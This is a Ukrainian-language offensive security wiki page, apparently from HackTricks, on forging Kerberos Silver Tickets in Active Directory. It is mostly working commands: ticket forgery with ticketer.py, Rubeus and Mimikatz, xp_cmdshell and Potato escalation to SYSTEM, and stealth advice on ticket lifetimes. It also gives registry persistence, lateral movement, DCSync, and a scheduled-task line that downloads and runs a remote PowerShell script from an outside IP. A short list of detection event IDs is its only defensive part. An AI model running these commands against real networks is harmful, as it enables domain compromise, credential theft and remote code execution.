# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Атака **Silver Ticket** передбачає експлуатацію service ticket в середовищах Active Directory (AD). Цей метод ґрунтується на **отриманні NTLM hash service account**, наприклад облікового запису комп’ютера, щоб підробити ticket Ticket Granting Service (TGS). За допомогою цього підробленого ticket зловмисник може отримати доступ до певних сервісів у мережі, **видаючи себе за будь-якого користувача**; зазвичай мета — отримати адміністративні привілеї. Зазначається, що використання AES keys для підроблення ticket є безпечнішим і менш помітним.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets менш помітні, ніж Golden Tickets, оскільки для них потрібен лише **hash service account**, а не облікового запису krbtgt. Однак вони обмежені конкретним сервісом, на який націлені. Крім того, достатньо просто викрасти пароль користувача.
Крім того, якщо ви скомпрометуєте **пароль облікового запису зі SPN**, можете використати його для створення Silver Ticket і видавати себе за будь-якого користувача цього сервісу.

### Сучасні зміни Kerberos (домени лише з AES)

- Оновлення Windows, починаючи з **8 Nov 2022 (KB5021131)**, за можливості призначають service ticket ключі сеансу **AES** за замовчуванням і поступово виводять з ужитку RC4. Очікується, що до середини **2026** DC постачатимуться з **вимкненим за замовчуванням** RC4, тому підроблення silver ticket за допомогою NTLM/RC4 hash дедалі частіше завершуватиметься помилкою `KRB_AP_ERR_MODIFIED`. Завжди отримуйте **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) цільового service account.<sup>[[5]](#references)</sup>
- Якщо для service account параметр `msDS-SupportedEncryptionTypes` обмежено AES, потрібно підробляти ticket з `/aes256` або `-aesKey`; RC4 (`/rc4` або `-nthash`) не працюватиме, навіть якщо у вас є NTLM hash.<sup>[[6]](#references)</sup>
- gMSA/облікові записи комп’ютерів змінюються кожні 30 днів; перед підробленням отримайте **поточний AES key** з LSASS, Secretsdump/NTDS або DCsync.
- OPSEC: стандартний час дії ticket у засобах часто становить **10 років**; задавайте реалістичну тривалість (наприклад, `-duration 600` хвилин), щоб уникнути виявлення через аномальний час дії.<sup>[[6]](#references)</sup>

Для створення ticket використовують різні інструменти залежно від операційної системи:

### У Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### У Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

Служба CIFS часто є ціллю для доступу до файлової системи жертви, але для виконання завдань і WMI-запитів можна також використати інші служби, як-от HOST і RPCSS.

### Приклад: служба MSSQL (MSSQLSvc) + Potato до SYSTEM

Якщо у вас є NTLM-хеш (або ключ AES) облікового запису, якому належить **зареєстрований точний SPN служби SQL**, ця служба може прийняти підроблений service ticket. Клас служби та ім’я хоста в квитку мають відповідати фактичному SPN; не припускайте, що в кожній інсталяції використовується `MSSQLSvc/`. Заявлена ідентичність також має бути прив’язана до логіна SQL із дозволами, необхідними для ввімкнення та запуску `xp_cmdshell`. Успішні команди `xp_cmdshell` виконуються від імені ідентичності процесу служби SQL (або налаштованого проксі для викликів не від sysadmin). Перш ніж розглядати окремий шлях Potato, перевірте, чи ввімкнено `SeImpersonatePrivilege` у **токені цього процесу**; сама конфігурація служби або SPN цього не доводить.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Якщо отриманий контекст має SeImpersonatePrivilege (що часто трапляється для облікових записів служб), скористайтеся варіантом Potato, щоб отримати SYSTEM:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Більше інформації про зловживання MSSQL і ввімкнення xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Огляд технік Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Доступні служби

| Тип служби                               | Сервісні Silver Tickets                                                  |
| ---------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Залежно від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Іноді можна просто запросити: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, також psexec            | CIFS                                                                       |
| Операції LDAP, зокрема DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

За допомогою **Rubeus** можна **запросити всі** ці квитки, використавши параметр:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event ID для Silver Tickets

- 4624: Вхід облікового запису
- 4634: Вихід облікового запису
- 4672: Вхід адміністратора
- **Відсутність попередніх подій 4768/4769 на DC** для того самого клієнта/служби — поширена ознака того, що підроблений TGS було безпосередньо пред’явлено службі.
- Аномально тривалий час дії квитка або неочікуваний тип шифрування (RC4, коли домен вимагає AES) також помітні в даних 4769/4624.

## Закріплення

Щоб запобігти зміні паролів машинами кожні 30 днів, установіть `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` або задайте для `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` значення, більше за 30 днів, щоб визначити періодичність зміни пароля машинами.<sup>[[3]](#references)</sup>

## Зловживання сервісними квитками

У наведених нижче прикладах припустімо, що квиток отримано з імітацією облікового запису адміністратора.

### CIFS

З цим квитком ви зможете отримати доступ до папок `C$` і `ADMIN$` через **SMB** (якщо до них відкрито доступ) і копіювати файли в будь-яку частину віддаленої файлової системи, виконавши щось на кшталт:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Також ви зможете отримати shell на хості або виконувати довільні команди за допомогою **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

З цим дозволом ви зможете створювати заплановані завдання на віддалених комп’ютерах і виконувати довільні команди:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

За допомогою цих квитків можна **виконувати WMI у системі-жертві**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Find **більше інформації про wmiexec** на цій сторінці:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### ХОСТ + WSMAN (WINRM)

Маючи доступ до комп’ютера через winrm, ви можете **отримати до нього доступ** і навіть запустити PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Перегляньте цю сторінку, щоб дізнатися про **інші способи підключення до віддаленого хоста за допомогою winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Зверніть увагу: **winrm має бути активним і прослуховувати з’єднання** на віддаленому комп’ютері, щоб отримати до нього доступ.

### LDAP

Маючи ці привілеї, можна отримати дамп бази даних DC за допомогою **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Дізнайтеся більше про DCSync** на цій сторінці:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Як атакувати Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Процес роботи з паролем облікового запису комп’ютера - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + шлях через Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: посилення Kerberos і застарівання RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Поточні параметри Impacket ticketer.py (AES/keytab/тривалість)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
